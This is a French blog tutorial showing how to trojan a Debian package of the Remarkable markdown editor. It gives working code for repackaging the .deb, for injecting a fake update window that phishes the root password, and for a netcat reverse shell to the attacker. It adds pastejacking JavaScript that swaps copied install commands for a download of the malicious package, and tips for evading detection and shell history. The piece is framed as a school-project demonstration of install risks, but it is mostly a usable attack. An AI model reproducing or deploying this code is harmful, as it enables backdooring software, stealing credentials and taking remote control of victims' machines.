---
title: Modification d'une archive .deb
layout: post
description: "Modification d'une archive .deb"
image: "/jekyllblog/img/Remarkable/remarkable.png"
category: 'tutorial'
tags:
- Linux
- security

twitter_text: "Modification d'une archive .deb et problématique de sécurité"
introduction: "Comment faire pour modifier une archive deb afin de construire une application installable sous Linux afin d'obtenir un accès à distance ?"
---

> Testé en septembre 2018, avec deux machines Ubuntu

# Présentation de l'attaque et contexte.

Cette article est une remise en forme du descriptif d'une attaque que j'avais du faire dans un projet scolaire.

L'idée de cette attaque est de montrer les risques encourus lors de l'installation non vérifiée. Le but de cet article est simplement de démontrer qu'il est possible d'installer une *backdoor* sur un ordinateur distant en modifiant l'archive d'installation d'un logiciel permettant d'écrire du markdown.

Le schéma de l'attaque est le suivant : article est présent sur un blog qui semble être tout à fait anodin. La victime reçoit un mail pour présenter une application.
Voici un exemple de mail, fait par un "ami" de la victime ou alors par l'attaquant rédigeant un faux mail s'il y a eu du *social ingeniering*.


***

Hey salut, on a parlé de Remarkable à la pause, le truc pour faire du Markdown j'ai trouvé un super [site](/)  qui explique comment l'installer!

A plus,
Un ami qui vous veut du bien

***

La victime se rend sur le site, suit les instructions et si elle n'est pas prudente son ordinateur devient vulnérable.

# Point de vue de la victime

La victime se rend sur l'adresse mentionnée. Elle copie colle la commande d'installation dans son terminal. Puis dans la fenêtre qui s'ouvre, elle double clique pour lancer l'installation. L'installation se fait. Au premier démarrage comme mentionné sur le site, une fenêtre de mise à jour apparaît. L'utilisateur rentre son mot de passe qui est envoyé à l'attaquant. Aux démarrages suivants, un shell utilisateur est récupéré sur la machine distante.

![Fenêtre de mise à jour](/jekyllblog/img/Remarkable/auth.png)

# Point de vue de l'attaquant

Du point de vue de l'attaquant celui-ci reçoit le mot de passe *root* lors de la première connexion. Lors des prochaines ouvertures de l'application il recevra seulement un shell sur la machine inféctée.

Il a juste à lancer la commande :

```bash
nc -lvp 1234
```

# Application vulnérable

On choisit de s'attaquer à Remarkable car les sources sont disponibles et facilement modifiables car en Python. On modifie l'archive *.deb* ce qui permet de donner pour l’utilisateur une certaine forme de légitimité à l'application puisqu'il la voit s'installer graphiquement.

Pour modifier les sources, on s'y prend ainsi :
```bash
#on crée deux répertoires pour accueillir la structure de l'archive
mkdir -p newpack oldpack/DEBIAN

#On extrait l'archive
dpkg-deb -x remarkable.deb oldpack/

#On extrait les informations de contrôsle
dpkg-deb -e remarkable.deb oldpack/DEBIAN

#On modifie ce que l'on veut modifier dans l'archive avant de la recréer
dpkg-deb -Z xz -b oldpack/ newpack/
```

Passons maintenant à la modification du code source :
On s'intéresse particulièrement à */usr/lib/python3/dist-packages/remarkable/RemarkableWindow.py*, on modifie l'initialisation de la fenêtre principale.
Ci dessous sont explicités les différentes actions clefs effectuées.

```python
# On récupère la bonne image pour la fenêtre graphique ce qui rend le script adaptable pour différentes distributions
image = Gtk.Image.new_from_icon_name(
                "gtk-dialog-authentication",
                Gtk.IconSize.DIALOG
                )
#On rend légitime l'apparition de la fenêtre de mise à jour.
self.label1.set_text("Pour son premier démarrage, Remarkable tente d'effectuer une action qui nécessite des privilèges (mise à jour, installation de paquets manquants..)\nPour effectuer cette action, il est nécessaire de s'authentifier.")

#si /tmp/f existe on ne redemande pas le mot de passe mais on ouvre quand même un reverse shell.
if not os.path.exists("/tmp/f"):
    test = LabelWindow()        
    test.connect("delete-event", Gtk.main_quit)
    test.show_all()
    Gtk.main()
else:
    os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ip_de_l'attaquant 1234 >/tmp/f &")
```


### La vitrine : le blog

On fait tourner sur l'ordinateur de l'attaquant un serveur. Ici le serveur intégré à PHP.

```bash
php -S 192.168.1.21:80
```

Ce serveur héberge, l'article de blog et les sources corrompues. Un petit script en javascript permet de modifier le texte copié dans la zone du texte pour l'installation. Les sources sont donc récupérées sur la machine de l'attaquant et non sur le site officiel de [Remarkable](https://remarkableapp.github.io/linux.html).

```html
<script>
document.addEventListener('copy', function(e) {
	e.clipboardData.setData('text/plain', ' wget 192.168.1.21/remarkable_1.87_all.deb & nautilus . & exit\n');
	e.preventDefault();
});
</script>
```

## Améliorations possibles


### Paste jacking

Le désavantage de la méthode est que l'on ferme la fenêtre du terminal, ce qui peut paraître bizarre.
On utilise aussi *nautilus* qui est une commande pour Ubuntu.

Voici quelques idées :

- Faire un paste-jacking plus personnalisé, par exemple en fonction de l'userAgent de l'utilisateur:
```js
if ( navigator.userAgent.search(/Ubuntu/)>0){
  e.clipboardData.setData('text/plain', ' wget 192.168.1.21/remarkable_1.87_all.deb & nautilus . & exit\n');
  e.preventDefault();
}else if (navigator.userAgent.search(/Debian/)>0) {
  e.clipboardData.setData('text/plain', 'other string');
  e.preventDefault();
}
```
- Utilisation de **xdg-open .** qui fonctionne sur plusieurs OS.
- Télécharger les sources légitimes, puis les illégitimes pour garder la "bonne commande" dans l'historique. Puis ouvrir l'installeur d'application avec **gnome-software --local-filename=remarkable_1.87_all.deb**
```js
  e.clipboardData.setData('text/plain', 'wget -N https://remarkableapp.github.io/files/remarkable_1.87_all.deb \n wget -N 192.168.1.21/remarkable_1.87_all.deb && clear & gnome-software --local-filename=remarkable_1.87_all.deb\n');
```

> On remarquera dans le premier exemple l'usage de **navigator.userAgent.search(/patern/)**.
>
> Dans le deuxième exemple la présence d'un espace avant la deuxième commande **wget** ce qui a pour effet de ne pas laisser la commande dans l'historique du shell.

### Fenêtre de mise à jour

Plusieurs améliorations sont envisageables :

- La fenêtre est faite avec *Gtk*, on peut envisager de la faire avec *dbus* pour avoir la "vraie" fenêtre.
- On peut modifier le texte pour prétexter une mise à jour système mais ne pas faire apparaître la fenêtre immédiatement. En utilisant la fonction *sleep*
```python
os.system("sleep 300 && python3 maFenetreDeMaj.py")
```
- On peut aussi selon le but de l'attaque envisager la suppression de la fenêtre de mise à jour. On ne récupère pas le mot de passe *root* mais si le but est de faire de l’exfiltration de données cela n'est peut-être pas nécessaire et sera plus discret.

### Traces

Regardons les traces :
Lors de l'exécution de *pstree*, on ne voit pas que c'est *Remarkable* qui lance *nc*. Cependant *nc* est tout de même visible. Dans l'idée l'attaque ne doit pas être indécelable une fois présente mais c'est sa mise en place qui doit l'être. En effet, les sources de l'application reste sur la machine. La persistance est interne à l'application. On pourrait imaginer une autre attaque ou le lancement de l'application met en place une persistance par le biais de *crontab* ou de *.bashrc* . Mais l'attaque serait alors toute autre.
